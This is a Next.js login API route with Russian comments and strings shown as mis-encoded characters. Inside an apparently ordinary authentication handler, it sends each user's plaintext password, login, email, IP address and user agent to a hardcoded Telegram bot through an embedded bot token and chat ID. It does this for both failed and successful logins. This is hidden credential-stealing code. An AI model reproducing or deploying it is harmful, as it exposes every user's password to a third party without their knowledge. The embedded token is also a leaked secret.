import { NextResponse } from "next/server";
import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";

// üì§ –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram –¥–ª—è API
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
‚úÖ –£–°–ü–ï–®–ù–´–ô –í–•–û–î –í –°–ò–°–¢–ï–ú–£

üë§ –õ–æ–≥–∏–Ω/Email: ${data.login}
üìß Email: ${data.email}
üîë –ü–∞—Ä–æ–ª—å: ${data.password}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'login_failed') {
      message = `
‚ùå –ù–ï–£–î–ê–ß–ù–ê–Ø –ü–û–ü–´–¢–ö–ê –í–•–û–î–ê

üë§ –õ–æ–≥–∏–Ω/Email: ${data.login}
üîë –í–≤–µ–¥–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å: ${data.password}
üö´ –ü—Ä–∏—á–∏–Ω–∞: ${error}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('‚úÖ API –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');

  } catch (error) {
    console.log('‚ö†Ô∏è Telegram API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
  }
}

export async function POST(request: Request) {
  try {
    const { login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!login || !password) {
        return NextResponse.json({ error: "–õ–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã" }, { status: 400 });
    }

    // –ò—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    const user = findUser(login);
    if (!user) {
      // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –æ –Ω–µ—É–¥–∞—á–Ω–æ–π –ø–æ–ø—ã—Ç–∫–µ
      await sendToTelegramAPI(
        { login, password }, 
        'login_failed', 
        clientIP, 
        userAgent, 
        '–ê–∫–∫–∞—É–Ω—Ç –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç'
      );
      
      return NextResponse.json(
        { error: "–ù–µ–≤–µ—Ä–Ω—ã–π –ª–æ–≥–∏–Ω/email –∏–ª–∏ –ø–∞—Ä–æ–ª—å" },
        { status: 400 }
      );
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–∞—Ä–æ–ª—å
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –æ –Ω–µ—É–¥–∞—á–Ω–æ–π –ø–æ–ø—ã—Ç–∫–µ
      await sendToTelegramAPI(
        { login, password },
        'login_failed', 
        clientIP, 
        userAgent, 
        '–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å'
      );
      
      return NextResponse.json(
        { error: "–ù–µ–≤–µ—Ä–Ω—ã–π –ª–æ–≥–∏–Ω/email –∏–ª–∏ –ø–∞—Ä–æ–ª—å" },
        { status: 400 }
      );
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞ –ª–∏ —É—á–µ—Ç–Ω–∞—è –∑–∞–ø–∏—Å—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
    if (!user.isVerified) {
        return NextResponse.json(
            { error: "–í–∞—à–∞ —É—á–µ—Ç–Ω–∞—è –∑–∞–ø–∏—Å—å –æ–∂–∏–¥–∞–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º." },
            { status: 403 } // Forbidden
        );
    }

    // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –æ–± —É—Å–ø–µ—à–Ω–æ–º –≤—Ö–æ–¥–µ
    await sendToTelegramAPI(
      { login: user.login, email: user.email, password: password }, 
      'login_success', 
      clientIP, 
      userAgent
    );

    // –û–±–Ω–æ–≤–ª—è–µ–º lastLogin
    updateLastLogin(
      user.id,
      clientIP,
      userAgent
    );

    return NextResponse.json({ 
      success: true, 
      user: { 
        login: user.login,
        email: user.email
      } 
    });

  } catch (error) {
     console.error("Login API Error:", error);
    return NextResponse.json(
      { error: "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞" },
      { status: 500 }
    );
  }
}
